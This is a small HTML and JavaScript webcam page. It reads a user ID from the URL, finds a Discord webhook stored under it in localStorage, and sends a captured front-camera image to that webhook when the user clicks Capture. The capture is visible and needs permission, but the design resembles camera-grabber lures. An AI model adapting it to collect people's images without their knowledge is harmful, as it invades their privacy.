<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera App</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            background-color: #1a1a1a;
        }
        video {
            margin-top: 20px;
            width: 80%;
            max-width: 500px;
            border-radius: 10px;
            opacity: 0.7;
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #0f0;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0c0;
        }
        #errorMessage {
            color: red;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <h1>Camera App</h1>
    <video id="webcam" autoplay></video>
    <button id="captureButton">Capture</button>
    <p id="errorMessage"></p>

    <script>
        const video = document.getElementById('webcam');
        const captureButton = document.getElementById('captureButton');
        const errorMessage = document.getElementById('errorMessage');

        const urlParams = new URLSearchParams(window.location.search);
        const userID = urlParams.get('userID');

        if (!userID) {
            errorMessage.textContent = "No User ID found in the URL!";
        } else {
            // Check if the user ID exists in localStorage (simulating the database)
            const storedWebhookURL = localStorage.getItem(userID);

            if (!storedWebhookURL) {
                errorMessage.textContent = "Invalid or non-existent User ID!";
            } else {
                // Function to start the webcam
                async function startCamera() {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'user' }
                        });
                        video.srcObject = stream;
                    } catch (err) {
                        errorMessage.textContent = "Error accessing webcam: " + err.message;
                        console.error('Error accessing webcam:', err);
                    }
                }

                // Start the camera
                startCamera();

                // Capture button functionality
                captureButton.addEventListener('click', () => {
                    if (video.srcObject) {
                        captureAndSendImage(storedWebhookURL);
                    } else {
                        errorMessage.textContent = "No camera stream detected!";
                    }
                });
            }
        }

        // Function to capture the image and send it to Discord
        async function captureAndSendImage(webhookURL) {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'captured_image.png');
                formData.append('payload_json', JSON.stringify({
                    content: `Preview your captured image! User ID: ${userID}`
                }));

                try {
                    const response = await fetch(webhookURL, {
                        method: 'POST',
                        body: formData,
                    });

                    if (response.ok) {
                        alert("Image sent successfully!");
                    } else {
                        alert("Failed to send the image.");
                    }
                } catch (error) {
                    console.error('Error sending image:', error);
                }
            }, 'image/png');
        }
    </script>

</body>
</html>
